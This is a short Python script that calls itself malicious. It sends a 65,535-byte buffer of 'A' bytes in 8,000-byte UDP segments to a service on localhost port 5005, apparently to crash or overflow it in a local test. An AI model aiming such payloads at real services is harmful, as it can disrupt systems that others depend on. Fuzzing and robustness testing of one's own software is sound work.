import socket

# Target IP and port
target_ip = "localhost"
target_port = 5005

# Create a malicious UDP packet
# Maximum payload size
malicious_payload = b"A" * 65535
# Segment size
packet_size = 8000
segments = [malicious_payload[i:i+packet_size] for i in range(0, len(malicious_payload), packet_size)]

# Create a UDP socket
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Send the packet to the target (for each segment)
for segment in segments:
    udp_socket.sendto(segment, (target_ip, target_port))

print("Malicious packet sent successfully.")
